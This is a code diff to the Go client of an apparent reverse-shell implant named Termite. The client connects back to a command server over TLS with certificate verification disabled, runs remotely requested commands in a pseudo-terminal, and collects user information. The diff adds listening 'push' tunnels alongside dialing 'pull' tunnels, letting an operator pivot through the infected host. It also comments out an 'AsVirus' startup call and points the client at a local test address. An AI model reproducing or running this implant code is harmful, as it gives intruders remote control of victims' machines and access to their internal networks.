@@ -69,7 +69,8 @@ type TermiteProcess struct {
 }
 
 var processes map[string]*TermiteProcess
-var tunnels map[string]*net.Conn
+var pullTunnels map[string]*net.Conn
+var pushTunnels map[string]*net.Conn
 
 type Client struct {
 	Conn    *tls.Conn
@@ -91,10 +92,12 @@ func handleConnection(c *Client) {
 		backoff.Reset()
 		switch msg.Type {
 		case message.STDIO:
+			log.Debug("case message.STDIO")
 			if termiteProcess, exists := processes[msg.Body.(*message.BodyStdio).Key]; exists {
 				termiteProcess.ptmx.Write(msg.Body.(*message.BodyStdio).Data)
 			}
 		case message.WINDOW_SIZE:
+			log.Debug("case message.WINDOW_SIZE")
 			serverWindowSize := &pty.Winsize{
 				Cols: uint16(msg.Body.(*message.BodyWindowSize).Columns),
 				Rows: uint16(msg.Body.(*message.BodyWindowSize).Rows),
@@ -106,6 +109,7 @@ func handleConnection(c *Client) {
 				pty.Setsize(termiteProcess.ptmx, serverWindowSize)
 			}
 		case message.PROCESS_START:
+			log.Debug("case message.PROCESS_START")
 			bodyStartProcess := msg.Body.(*message.BodyStartProcess)
 			if bodyStartProcess.Path == "" {
 				continue
@@ -218,8 +222,11 @@ func handleConnection(c *Client) {
 				delete(processes, bodyStartProcess.Key)
 			}()
 		case message.PROCESS_STARTED:
+			log.Debug("case message.PROCESS_STARTED")
 		case message.PROCESS_STOPED:
+			log.Debug("case message.PROCESS_STOPED")
 		case message.GET_CLIENT_INFO:
+			log.Debug("case message.GET_CLIENT_INFO")
 			// User Information
 			userInfo, err := user.Current()
 			var username string
@@ -263,34 +270,37 @@ func handleConnection(c *Client) {
 				return
 			}
 		case message.DUPLICATED_CLIENT:
+			log.Debug("case message.DUPLICATED_CLIENT")
 			backoff.Current = oldBackoffCurrent
 			log.Error("Duplicated connection")
 			os.Exit(0)
 		case message.PROCESS_TERMINATE:
+			log.Debug("case message.PROCESS_TERMINATE")
 			key := msg.Body.(*message.BodyTerminateProcess).Key
 			log.Success("Request terminate %s", key)
 			if termiteProcess, exists := processes[key]; exists {
 				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGTERM)
 				termiteProcess.ptmx.Close()
 			}
-		case message.TUNNEL_CONNECT:
-			address := msg.Body.(*message.BodyTunnelConnect).Address
-			token := msg.Body.(*message.BodyTunnelConnect).Token
+		case message.PULL_TUNNEL_CONNECT:
+			log.Debug("case message.PULL_TUNNEL_CONNECT")
+			address := msg.Body.(*message.BodyPullTunnelConnect).Address
+			token := msg.Body.(*message.BodyPullTunnelConnect).Token
 
 			conn, err := net.Dial("tcp", address)
 			if err != nil {
 				log.Error(err.Error())
 				c.Encoder.Encode(message.Message{
-					Type: message.TUNNEL_CONNECT_FAILED,
-					Body: message.BodyTunnelConnectFailed{
+					Type: message.PULL_TUNNEL_CONNECT_FAILED,
+					Body: message.BodyPullTunnelConnectFailed{
 						Token:  token,
 						Reason: err.Error(),
 					},
 				})
 			} else {
 				err := c.Encoder.Encode(message.Message{
-					Type: message.TUNNEL_CONNECTED,
-					Body: message.BodyTunnelConnected{
+					Type: message.PULL_TUNNEL_CONNECTED,
+					Body: message.BodyPullTunnelConnected{
 						Token: token,
 					},
 				})
@@ -298,7 +308,7 @@ func handleConnection(c *Client) {
 				if err != nil {
 					log.Error(err.Error())
 				} else {
-					tunnels[token] = &conn
+					pullTunnels[token] = &conn
 					go func() {
 						for {
 							data := make([]byte, 0x100)
@@ -306,8 +316,8 @@ func handleConnection(c *Client) {
 							if err != nil {
 								log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
 								c.Encoder.Encode(message.Message{
-									Type: message.TUNNEL_DISCONNECTED,
-									Body: message.BodyTunnelDisconnected{
+									Type: message.PULL_TUNNEL_DISCONNECTED,
+									Body: message.BodyPullTunnelDisconnected{
 										Token: token,
 									},
 								})
@@ -316,8 +326,8 @@ func handleConnection(c *Client) {
 							} else {
 								if n > 0 {
 									c.Encoder.Encode(message.Message{
-										Type: message.TUNNEL_DATA,
-										Body: message.BodyTunnelData{
+										Type: message.PULL_TUNNEL_DATA,
+										Body: message.BodyPullTunnelData{
 											Token: token,
 											Data:  data[0:n],
 										},
@@ -328,10 +338,11 @@ func handleConnection(c *Client) {
 					}()
 				}
 			}
-		case message.TUNNEL_DATA:
-			token := msg.Body.(*message.BodyTunnelData).Token
-			data := msg.Body.(*message.BodyTunnelData).Data
-			if conn, exists := tunnels[token]; exists {
+		case message.PULL_TUNNEL_DATA:
+			log.Debug("case message.PULL_TUNNEL_DATA")
+			token := msg.Body.(*message.BodyPullTunnelData).Token
+			data := msg.Body.(*message.BodyPullTunnelData).Data
+			if conn, exists := pullTunnels[token]; exists {
 				_, err := (*conn).Write(data)
 				if err != nil {
 					(*conn).Close()
@@ -339,18 +350,122 @@ func handleConnection(c *Client) {
 			} else {
 				log.Error("No such tunnel")
 			}
-		case message.TUNNEL_DISCONNECT:
-			token := msg.Body.(*message.BodyTunnelDisconnect).Token
-			if conn, exists := tunnels[token]; exists {
+		case message.PULL_TUNNEL_DISCONNECT:
+			log.Debug("case message.PULL_TUNNEL_DISCONNECT")
+			token := msg.Body.(*message.BodyPullTunnelDisconnect).Token
+			if conn, exists := pullTunnels[token]; exists {
 				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
 				(*conn).Close()
-				delete(tunnels, token)
+				delete(pullTunnels, token)
 				c.Encoder.Encode(message.Message{
-					Type: message.TUNNEL_DISCONNECTED,
-					Body: message.BodyTunnelDisconnected{
+					Type: message.PULL_TUNNEL_DISCONNECTED,
+					Body: message.BodyPullTunnelDisconnected{
 						Token: token,
 					},
 				})
+			} else {
+				log.Error("No such tunnel")
+			}
+		case message.PUSH_TUNNEL_CREATE:
+			log.Debug("case message.PUSH_TUNNEL_CREATE")
+			address := msg.Body.(*message.BodyPushTunnelCreate).Address
+			token := msg.Body.(*message.BodyPushTunnelCreate).Token
+			server, err := net.Listen("tcp", address)
+			if err != nil {
+				c.Encoder.Encode(message.Message{
+					Type: message.PUSH_TUNNEL_CREATE_FAILED,
+					Body: message.BodyPushTunnelCreateFailed{
+						Token:  token,
+						Reason: err.Error(),
+					},
+				})
+			} else {
+				c.Encoder.Encode(message.Message{
+					Type: message.PUSH_TUNNEL_CREATED,
+					Body: message.BodyPushTunnelCreated{
+						Token: token,
+					},
+				})
+
+				go func() {
+					for {
+						conn, err := server.Accept()
+						if err != nil {
+							// TODO: error handling
+							continue
+						} else {
+							c.Encoder.Encode(message.Message{
+								Type: message.PUSH_TUNNEL_CONNECT,
+								Body: message.BodyPushTunnelConnect{
+									Token: token,
+								},
+							})
+							pushTunnels[token] = &conn
+						}
+					}
+				}()
+			}
+		case message.PUSH_TUNNEL_CONNECTED:
+			log.Debug("case message.PUSH_TUNNEL_CONNECTED")
+			token := msg.Body.(*message.BodyPushTunnelConnected).Token
+			if conn, exists := pushTunnels[token]; exists {
+				go func() {
+					for {
+						buffer := make([]byte, 0x100)
+						n, err := (*conn).Read(buffer)
+						if err != nil {
+							c.Encoder.Encode(message.Message{
+								Type: message.PUSH_TUNNEL_DISCONNECTED,
+								Body: message.BodyPushTunnelDisonnected{
+									Token:  token,
+									Reason: err.Error(),
+								},
+							})
+							(*conn).Close()
+							delete(pushTunnels, token)
+							break
+						} else {
+							c.Encoder.Encode(message.Message{
+								Type: message.PUSH_TUNNEL_DATA,
+								Body: message.BodyPushTunnelData{
+									Token: token,
+									Data:  buffer[0:n],
+								},
+							})
+						}
+					}
+				}()
+			} else {
+				log.Error("No such tunnel")
+			}
+		case message.PUSH_TUNNEL_DISCONNECTED:
+			log.Debug("case message.PUSH_TUNNEL_DISCONNECTED")
+			token := msg.Body.(*message.BodyPushTunnelDisonnected).Token
+			if conn, exists := pushTunnels[token]; exists {
+				(*conn).Close()
+				delete(pushTunnels, token)
+			} else {
+				log.Error("No such tunnel")
+			}
+		case message.PUSH_TUNNEL_CONNECT_FAILED:
+			log.Debug("case message.PUSH_TUNNEL_CONNECT_FAILED")
+			token := msg.Body.(*message.BodyPushTunnelConnectFailed).Token
+			if conn, exists := pushTunnels[token]; exists {
+				(*conn).Close()
+				delete(pushTunnels, token)
+			} else {
+				log.Error("No such tunnel")
+			}
+		case message.PUSH_TUNNEL_DATA:
+			log.Debug("case message.PUSH_TUNNEL_DATA")
+			token := msg.Body.(*message.BodyPushTunnelData).Token
+			data := msg.Body.(*message.BodyPushTunnelData).Data
+			if conn, exists := pushTunnels[token]; exists {
+				_, err := (*conn).Write(data)
+				if err != nil {
+					(*conn).Close()
+					delete(pushTunnels, token)
+				}
 			} else {
 				log.Error("No such tunnel")
 			}
@@ -375,6 +490,7 @@ func StartClient() bool {
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	service := strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+	service = "127.0.0.1:13337"
 	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
 		log.Debug("Connecting to: %s", service)
 		conn, err := tls.Dial("tcp", service, &config)
@@ -431,11 +547,12 @@ func AsVirus() {
 }
 
 func main() {
-	AsVirus()
+	// AsVirus()
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
-	tunnels = map[string]*net.Conn{}
+	pullTunnels = map[string]*net.Conn{}
+	pushTunnels = map[string]*net.Conn{}
 	for {
 		if !StartClient() {
 			break
